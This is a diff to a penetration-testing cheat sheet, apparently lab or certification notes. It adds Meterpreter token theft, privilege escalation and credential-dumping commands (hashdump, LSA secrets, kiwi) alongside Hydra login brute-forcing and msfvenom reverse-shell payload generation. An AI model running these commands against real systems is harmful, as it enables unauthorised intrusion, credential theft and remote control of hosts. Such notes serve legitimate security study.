@@ -832,7 +832,7 @@ Crack hashes:
 man 5 crypt
 
 # Spotty: but IDs hashes
-hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1' > hashid.txt
+hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
 
 hash-identifier
 ```
@@ -916,6 +916,7 @@ msf6 > creds
 ```
 
 ### 🔨 Brute-Forcing Web & SSH Logins with Hydra
+
 ```bash
 # Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
 hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -o hydra_web_login.txt
@@ -982,11 +983,26 @@ search -d C:\\ -f root.txt
 # REMEMBER: for Windows, quoting and double slashes 
 cat "C:\\Programs and Files (x86)\\"
 
-hashdump  # CrackStation
-# --- kiwi (like mimikatz) ---
+# Migrate
 ps -s | grep svchost
 migrate <PID>
 
+getsystem
+getprivs
+
+# List security tokens of user and group
+list_tokens -u
+list_tokens -g
+impersonate_token <DOMAIN_NAMEUSERNAME>
+steal_token <PID>
+drop_token
+
+# Dumps creds
+hashdump  # CrackStation
+lsa_dump_sam
+lsa_dump_secrets
+
+# Better dump creds
 load kiwi
 creds_all
 
@@ -1039,7 +1055,7 @@ services -S <search_term>
 
 ### 🎯 Msfvenom
 
-- **Note:** stageless payloads user underscores in the name '_' like `shell_reverse_tcp`
+- **Note:** *stageless* payloads user underscores in the name '_' like `shell_reverse_tcp`
 
 ```bash
 # Listener for reverse callbacks
@@ -1051,7 +1067,7 @@ set lport <LISTEN_PORT>
 
 # Msfvenom commands
 msfvenom -l payloads
-msfvenom --list formats
+msfvenom -l formats
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
 msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
@@ -1060,6 +1076,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f ra
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp
 msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py
 ```
+
 ### 🔍 Scans
 
 ```bash
